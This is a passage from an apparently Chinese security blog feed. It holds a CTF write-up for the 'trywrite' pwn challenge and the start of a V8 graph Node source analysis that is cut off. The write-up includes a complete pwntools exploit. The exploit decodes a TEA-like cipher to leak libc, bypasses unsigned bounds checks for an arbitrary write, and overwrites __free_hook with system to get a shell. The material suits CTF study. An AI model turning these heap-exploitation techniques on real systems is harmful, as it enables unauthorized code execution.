class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">sub_F5E</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a2, _DWORD *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> first; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> second; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line">  first = *a1;</span><br><span class="line">  second = *a2;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 -= <span class="number">0x61C88647</span>;</span><br><span class="line">    first += (second + v5) ^ (<span class="number">16</span> * second + *key) ^ ((second &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">    second += (first + v5) ^ (<span class="number">16</span> * first + key[<span class="number">2</span>]) ^ ((first &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = first;</span><br><span class="line">  *a2 = second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mov     [rbp+var_4], <span class="number">9E3779</span>B9h</span><br><span class="line">mov     [rbp+var_8], <span class="number">0</span></span><br><span class="line">jmp     <span class="keyword">short</span> loc_1011</span><br></pre></td></tr></table></figure></p><p>v5这里每次会加上0x9E3779B9,那么循环16次会溢出</p><p>从gdb中查看v5最终是多少<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x7fffffffdf20</span>-<span class="number">0xc</span></span><br><span class="line"><span class="number">0x7fffffffdf14</span>: <span class="number">0xe3779b90</span></span><br></pre></td></tr></table></figure></p><p>倒着解密即可:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(first,second,key)</span>:</span></span><br><span class="line">    first=c_uint32(first)</span><br><span class="line">    second=c_uint32(second)</span><br><span class="line">    v5=c_uint32(<span class="number">0xe3779b90</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 倒着减</span></span><br><span class="line">        second.value -= (first.value + v5.value) ^ (<span class="number">16</span> * first.value + key[<span class="number">2</span>]) ^ ((first.value &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>])</span><br><span class="line">        first.value -= (second.value + v5.value) ^ (<span class="number">16</span> * second.value + key[<span class="number">0</span>]) ^ ((second.value &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>])</span><br><span class="line">        v5.value -= <span class="number">0x9E3779B9</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"@II"</span>,first.value,second.value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__decode</span><span class="params">(data,key)</span>:</span></span><br><span class="line">    key=struct.unpack(<span class="string">"@IIII"</span>,key)</span><br><span class="line">    length=int(len(data)/<span class="number">4</span>)</span><br><span class="line">    data=struct.unpack(<span class="string">'@'</span>+<span class="string">"I"</span>*length,data)</span><br><span class="line">    temp=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length/<span class="number">2</span>):</span><br><span class="line">        temp+=decode(data[<span class="number">2</span>*i],data[<span class="number">2</span>*i+<span class="number">1</span>],key)</span><br><span class="line">    <span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure></p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 key1_offset; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 key2_offset; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  Message *key1; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">void</span> *key2; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I separated the key of each message in two places."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Only you can tell me exactly where the first key is and how far the second key is from it."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I'll change them for you."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me how far the first key is from your heap:"</span>);</span><br><span class="line">  key1_offset = get_ul();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me how far the second key is from the first key:"</span>);</span><br><span class="line">  key2_offset = get_ul();</span><br><span class="line">  key1 = (Message *)(heap_addr + key1_offset);</span><br><span class="line">  key2 = (<span class="keyword">void</span> *)(heap_addr + key1_offset + <span class="number">136</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap_addr + key1_offset &gt; heap_addr + size[<span class="number">0</span>] - key2_offset || (<span class="keyword">unsigned</span> __int64)key1 &lt; heap_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Sorry~"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please tell me the new key:"</span>);</span><br><span class="line">    read_n(buf, <span class="number">16L</span>L);</span><br><span class="line">    my_memcpy(key1, buf, <span class="number">8</span>);</span><br><span class="line">    my_memcpy(key2, &amp;buf[<span class="number">8</span>], <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span> &amp;&amp; (!ptr[i] || key1 != ptr[i]); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">12</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"How dare you play with me?"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以利用change来达到任意写，但是有两个check:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heap_addr + key1_offset &gt; heap_addr + size[<span class="number">0</span>] - key2_offset || (unsigned __int64)key1 &lt; heap_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"Sorry~"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span> &amp;&amp; (!ptr[i] || key1 != ptr[i]); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">12</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"How dare you play with me?"</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>第一个check可以利用key2_offset来绕过:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001637</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">rax</span>, <span class="selector-tag">heap_addr</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000000163E</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rdx</span>, <span class="selector-attr">[rax]</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001641</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">rax</span>, <span class="selector-tag">size</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001648</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rax</span>, <span class="selector-attr">[rax]</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000000164B</span>                 <span class="selector-tag">add</span>     <span class="selector-tag">rax</span>, <span class="selector-tag">rdx</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000000164E</span>                 <span class="selector-tag">sub</span>     <span class="selector-tag">rax</span>, <span class="selector-attr">[rbp+var_38]</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001652</span>                 <span class="selector-tag">cmp</span>     <span class="selector-attr">[rbp+key1]</span>, <span class="selector-tag">rax</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001656</span>                 <span class="selector-tag">ja</span>      <span class="selector-tag">loc_1756</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000000165C</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">rax</span>, <span class="selector-tag">heap_addr</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001663</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rax</span>, <span class="selector-attr">[rax]</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000001666</span>                 <span class="selector-tag">cmp</span>     <span class="selector-attr">[rbp+key1]</span>, <span class="selector-tag">rax</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:000000000000166A</span>                 <span class="selector-tag">jb</span>      <span class="selector-tag">loc_1756</span></span><br></pre></td></tr></table></figure></p><p>这里的比较是无符号数比较，那么可以利用key2_offset来进行溢出</p><p>第二个check:输入的key1_offset得到的key1的地址必须能够在ptr数组中找到，这个可以利用change的部分覆写来达到要求:<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">0x69</span>,<span class="number">0</span>,'\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">07</span>\<span class="keyword">x</span><span class="number">01</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">69</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">07</span>\<span class="keyword">x</span><span class="number">01</span>'.ljust(<span class="number">16</span>,'\<span class="keyword">x</span><span class="number">00</span>'))</span><br></pre></td></tr></table></figure></p><p><img src="/2019/08/31/复现近几个月比赛不会做的题/2.png" alt=""><br>修改后:<br><img src="/2019/08/31/复现近几个月比赛不会做的题/3.png" alt=""><br>写入的时候将0x1070068处存放的地址指向了0x1070050，为后续在这里写入__free_hook打下铺垫，同时部分覆写，将0x1070070处的地址修改为0x1070069，绕过此次写入检查.<br>然后在0x1070050这里写入free_hook的地址:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">change</span><span class="params">(<span class="number">0</span>x50,<span class="number">0</span>,p64(__free_hook)</span></span>+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure></p><p>最后写入system即可:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="name">__free_hook-heap_addr</span>,heap_addr+0x20000+1,p64(<span class="name">system_addr</span>)+'\n')</span><br></pre></td></tr></table></figure></p><h4 id="完整的exp如下-1"><a href="#完整的exp如下-1" class="headerlink" title="完整的exp如下:"></a>完整的exp如下:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./trywrite"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x0000000000013A3)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x0000000000014E2)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x00000000000159F)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000001777)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000001017)</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(first,second,key)</span>:</span></span><br><span class="line">    first=c_uint32(first)</span><br><span class="line">    second=c_uint32(second)</span><br><span class="line">    v5=c_uint32(<span class="number">0xe3779b90</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        second.value -= (first.value + v5.value) ^ (<span class="number">16</span> * first.value + key[<span class="number">2</span>]) ^ ((first.value &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>])</span><br><span class="line">        first.value -= (second.value + v5.value) ^ (<span class="number">16</span> * second.value + key[<span class="number">0</span>]) ^ ((second.value &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>])</span><br><span class="line">        v5.value -= <span class="number">0x9E3779B9</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"@II"</span>,first.value,second.value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__decode</span><span class="params">(data,key)</span>:</span></span><br><span class="line">    key=struct.unpack(<span class="string">"@IIII"</span>,key)</span><br><span class="line">    length=int(len(data)/<span class="number">4</span>)</span><br><span class="line">    data=struct.unpack(<span class="string">'@'</span>+<span class="string">"I"</span>*length,data)</span><br><span class="line">    temp=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length/<span class="number">2</span>):</span><br><span class="line">        temp+=decode(data[<span class="number">2</span>*i],data[<span class="number">2</span>*i+<span class="number">1</span>],key)</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"command&gt;&gt; \n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(key,data)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendafter(<span class="string">"Please tell me the key:\n"</span>,key)</span><br><span class="line">    a.sendafter(<span class="string">"e the date:"</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Please tell me the index:\n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Please tell me the index:\n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(offset_1,offset_2,new_key)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"first key is from your heap:\n"</span>,str(offset_1))</span><br><span class="line">    a.sendlineafter(<span class="string">"first key:\n"</span>,str(offset_2))</span><br><span class="line">    a.sendafter(<span class="string">"Please tell me the new key:\n"</span>,new_key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(heap)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"Please tell me where is your heap:\n"</span>,heap)</span><br><span class="line">    a.sendlineafter(<span class="string">"Do you want to tell me your name now?(Y/N)\n"</span>,<span class="string">"Y"</span>)</span><br><span class="line">    a.sendline(<span class="string">'AAA'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">heap_addr=<span class="number">0x1070000</span></span><br><span class="line">key=<span class="string">'A'</span>*<span class="number">16</span></span><br><span class="line">init(str(<span class="number">0xFF0000</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    add(key,<span class="string">"A\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(key,<span class="string">";/bin/sh\x00\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(key,<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">data=a.recv(<span class="number">0x80</span>)</span><br><span class="line">data = __decode(data, key)</span><br><span class="line">libc_base = u64(data[<span class="number">0</span>:<span class="number">8</span>])- <span class="number">0x3ebc00</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">change(<span class="number">0x69</span>,<span class="number">0</span>,<span class="string">'\x00\x07\x01\x00\x00\x00\x00\x69\x00\x07\x01'</span>.ljust(<span class="number">16</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">__free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">0x50</span>,<span class="number">0</span>,p64(__free_hook)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">change(__free_hook-heap_addr,heap_addr+<span class="number">0x20000</span>+<span class="number">1</span>,p64(system_addr)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h3&gt;&lt;p&gt;两个多月没咋学pwn了，看了一个多月v8没啥太大进展…，复现下近几个月的比赛，陆陆续续更新下…&lt;/p&gt;
&lt;h3 id=&quot;suctf201
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>v8 graph node部分源码分析</title>
    <link href="http://yoursite.com/2019/08/19/v8-graph-node%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/08/19/v8-graph-node部分源码分析/</id>
    <published>2019-08-19T07:56:25.000Z</published>
    <updated>2019-09-22T02:10:18.398Z</updated>
    
    <content type="html"><![CDATA[<h4 id="node"><a href="#node" class="headerlink" title="node:"></a>node:</h4><p>Node是graph的基本元素，graph中各node通过 input和use链 链接在一起<br>Node类大概如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Node* <span class="title">New</span><span class="params">(Zone* zone, NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                   Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> has_extensible_inputs)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Node* <span class="title">Clone</span><span class="params">(Zone* zone, NodeId id, <span class="keyword">const</span> Node* node)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputEdges</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Inputs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UseEdges</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uses</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AppendInput</span><span class="params">(Zone* zone, Node* new_to)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InsertInput</span><span class="params">(Zone* zone, <span class="keyword">int</span> index, Node* new_to)</span></span>;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Use</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OutOfLineInputs</span>;</span> <span class="comment">// 当input数量多余inline分配空间的容量时的 input的外部存储</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*头插法，first_use__指向头*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AppendUse</span><span class="params">(Use* use)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RemoveUse</span><span class="params">(Use* use)</span></span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> Operator* op_;</span><br><span class="line">Type type_;</span><br><span class="line">Mark mark_;</span><br><span class="line"><span class="keyword">uint32_t</span> bit_field_;</span><br><span class="line">Use* first_use_;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Node实例前后的内存布局，代码中注释的翻译：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//============================================================================</span></span><br><span class="line"><span class="comment">//== Memory layout ===========================================================</span></span><br><span class="line"><span class="comment">//============================================================================</span></span><br><span class="line"><span class="comment">// 节省graph的空间非常重要。 我们使用内存布局技巧，以节省空间的方式将&#123;Node&#125;对象映射到&#123;Use&#125;对象，反之亦然。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// &#123;Use&#125; links are laid out in memory directly before a &#123;Node&#125;, followed by</span></span><br><span class="line"><span class="comment">// direct pointers to input &#123;Nodes&#125;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// inline case:</span></span><br><span class="line"><span class="comment">// |Use #N  |Use #N-1|...|Use #1  |Use #0  |Node xxxx |I#0|I#1|...|I#N-1|I#N|</span></span><br><span class="line"><span class="comment">//          ^                              ^                  ^</span></span><br><span class="line"><span class="comment">//          + Use                          + Node             + Input</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 由于每个&#123;Use&#125;实例在成员bit_field_都记录了它的&#123;input_index&#125;，因此可以计算出&#123;Node&#125;的位置。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// out-of-line case:</span></span><br><span class="line"><span class="comment">//     |Node xxxx |</span></span><br><span class="line"><span 